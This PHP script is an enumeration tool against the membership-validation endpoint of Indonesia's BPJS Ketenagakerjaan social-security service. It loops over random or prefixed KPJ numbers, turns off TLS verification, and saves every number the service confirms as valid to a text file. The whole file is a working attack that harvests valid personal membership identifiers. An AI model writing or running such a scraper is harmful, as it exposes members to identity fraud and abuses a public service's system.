<?php
function str($length = 8) {
    return substr(str_shuffle(str_repeat($x='0123456789', ceil($length/strlen($x)) )),1,$length);
}
function save($filename, $content)
	{
	    $save = fopen($filename, "a");
	    fputs($save, "$content\r\n");
	    fclose($save);
	}
function gas($file, $mode){
if($mode == 1){
   $no = "1".mt_rand(0,9)."0".str(); 
}elseif($mode == 2){
    $no= "1502658".str(4);
}
$header = explode("\n", $str);
$c = curl_init("https://comarketing.bpjsketenagakerjaan.go.id/getValidasiTK_KPJ?KPJ=$no&NIK=&_=".time());
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_HEADER, true);
    curl_setopt($c, CURLOPT_HTTPHEADER, $header);
    $response = curl_exec($c);
    $httpcode = curl_getinfo($c);
    if (!$httpcode)
        return false;
    else {
        $header = substr($response, 0, curl_getinfo($c, CURLINFO_HEADER_SIZE));
        $body   = substr($response, curl_getinfo($c, CURLINFO_HEADER_SIZE));
    }
    if(!preg_match("/DATA DITEMUKAN/", $body)){
        return "Invalid ".$no;
    }else{
        save($file, $no);
 return "Found! ".$no;   
    }
}
####EDIT HERE####
$jumlah = 100;
$namafile = "bpjscode.txt";
$mode = 1; //mode 1 = random all - mode 2 = random with prefix 1502658
####END OF EDIT AREA####
echo "Run with mode ".$mode.PHP_EOL;
sleep(2);
echo "Starting on 5 second";
sleep(5);
for($i=0; $i<$jumlah; $i++){
    $o = $i+1;
    echo $o.". ".gas($namafile, $mode).PHP_EOL;
}
?>
